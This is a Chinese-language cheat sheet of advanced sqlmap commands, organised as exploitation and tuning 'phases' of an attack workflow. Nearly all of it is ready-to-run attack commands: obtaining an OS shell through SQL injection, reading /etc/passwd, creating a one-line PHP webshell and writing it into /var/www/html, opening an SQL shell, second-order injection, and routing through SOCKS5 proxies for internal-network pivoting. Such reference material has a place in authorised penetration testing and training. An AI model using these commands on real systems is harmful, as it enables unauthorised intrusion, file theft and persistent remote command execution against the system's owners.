# sqlmap 高级用法详细命令
## Phase 5: 高级利用

### OS Shell（获取系统命令执行）

```bash
# 条件：数据库用户有 FILE 权限 + 已知可写 Web 目录
timeout 480 sqlmap -u 'URL' --os-shell --batch \
    2>&1 | tee /tmp/sqlmap_output.log

# 指定 Web 根目录
sqlmap -u 'URL' --os-shell --web-root /var/www/html --batch
```

### 文件读写

```bash
# 读取文件
sqlmap -u 'URL' --file-read=/etc/passwd --batch

# 写入文件（上传 webshell）
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
sqlmap -u 'URL' --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php --batch
```

### SQL Shell

```bash
# 进入交互式 SQL 查询
sqlmap -u 'URL' --sql-shell --batch
```

### 二次注入 (Second-Order)

```bash
# 注入点和触发点不同
# --second-url: 注入后访问此 URL 检查结果
timeout 480 sqlmap -u 'http://target/register' \
    --data 'username=test&password=pass' \
    --second-url 'http://target/profile' \
    --batch --level 3 \
    2>&1 | tee /tmp/sqlmap_output.log
```

---

## Phase 6: 性能调优

```bash
# 多线程（默认 1，提高到 10）
sqlmap -u 'URL' --threads 10 --batch

# 指定数据库类型（跳过指纹识别）
sqlmap -u 'URL' --dbms mysql --batch

# 指定注入点（跳过其他参数测试）
sqlmap -u 'URL' -p id --batch

# 使用代理
sqlmap -u 'URL' --proxy http://127.0.0.1:8080 --batch

# 通过 SOCKS5 代理（内网渗透）
sqlmap -u 'URL' --proxy socks5://127.0.0.1:1080 --batch

# 自定义 User-Agent
sqlmap -u 'URL' --user-agent 'Mozilla/5.0' --batch

# 保持会话
sqlmap -u 'URL' --cookie 'PHPSESSID=xxx' --batch

# 跟随重定向
sqlmap -u 'URL' --follow-redirect --batch
```
